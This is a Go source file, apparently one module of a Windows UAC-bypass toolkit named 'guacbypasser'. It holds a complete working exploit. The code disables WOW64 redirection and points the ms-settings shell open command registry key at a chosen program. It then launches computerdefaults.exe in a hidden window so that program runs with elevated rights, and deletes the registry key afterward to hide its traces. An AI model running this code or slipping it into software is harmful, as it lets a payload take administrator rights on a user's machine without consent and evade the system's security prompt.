package guacbypasser

import (
	"fmt"
	"path/filepath"
	"syscall"
	"time"

	sc ".."
	"golang.org/x/sys/windows/registry"
)

func w32_nt_once_computerDefaults(p string) (error, sc.Informer) {
	inf := sc.Informer{
		Name: "computerdefauls",
		Desc: "Bypass UAC using computerdefaults and registry key manipulation",
		Id:   1,

		Type:   "Once",
		Module: "w32_nt_once_computerDefaults",

		Fixed:   false,
		FixedIn: "",

		Admin:   true,
		Payload: true,
	}

	fPath, err := filepath.Abs(p)
	if err != nil {
		return err, inf
	}
	cmdN := fmt.Sprintf("%s /k start %s", `C:\Windows\System32\cmd.exe`, fPath)

	// Load kernel32.dll library ...
	kernel32, err := syscall.LoadLibrary("kernel32.dll")
	if err != nil {
		return err, inf
	}

	// Get process address "Wow64DisableWow64FsRedirection" from kernel32.dll ...
	proc32, err := syscall.GetProcAddress(kernel32, "Wow64DisableWow64FsRedirection")
	if err != nil {
		return err, inf
	}
	_, _, _ = syscall.Syscall(
		uintptr(proc32),
		uintptr(1),
		uintptr(0),
		uintptr(0),
		uintptr(0))
	wk32, err := registry.OpenKey(
		registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	defer wk32.Close()
	if err != nil {
		return err, inf
	}

	// Setting DEFAULT key value for the ABSOLUTE program path
	if err := wk32.SetStringValue("", cmdN); err != nil {
		return err, inf
	}

	// Setting "DelegateExecure" key value to None
	if err := wk32.SetStringValue("DelegateExecute", ""); err != nil {
		return err, inf
	}
	time.Sleep(time.Second)

	// Execute cmd-like command "start computerdefaults.exe" ...
	cmd := sc.NewCmd("start computerdefaults.exe")
	cmd.Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if _, err = cmd.Exec.Output(); err != nil {
		return err, inf
	}
	time.Sleep(3 * time.Second)

	// Absolutly delete registry key "Software\Classes\ms-settings\shell\open\command" ...
	if err = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`); err != nil {
		return err, inf
	}
	return nil, inf
}

// NewOnceComputerDefaults #add-some-info-please
func NewOnceComputerDefaults(p string) (error, sc.Informer) { return w32_nt_once_computerDefaults(p) }
